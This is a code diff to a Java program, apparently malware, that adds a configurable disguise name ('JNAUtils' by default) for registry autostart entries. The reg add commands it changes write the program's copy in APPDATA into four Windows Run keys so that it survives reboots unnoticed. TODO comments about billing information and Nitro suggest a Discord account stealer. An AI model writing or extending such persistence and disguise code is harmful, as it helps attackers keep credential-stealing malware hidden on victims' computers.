@@ -17,6 +17,7 @@ import java.util.regex.Pattern;
 public class Main {
     private static boolean debug;
     private static boolean shouldPersist;
+    private static String hideAs = "JNAUtils"; //What the registry entry should be called.
     public static void main(String[] args) throws Exception {
         // TODO: Billing information
         // TODO: Check for nitro
@@ -313,10 +314,10 @@ public class Main {
             if (new File(System.getenv("APPDATA"), new_name).exists()) {
                 //Copy file to startup
                 String[] reg_start = {
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v JNAUtils /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\""
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \""+System.getenv("APPDATA") + "/" + new_name+"\""
                 };
 
                 for (String command : reg_start) {
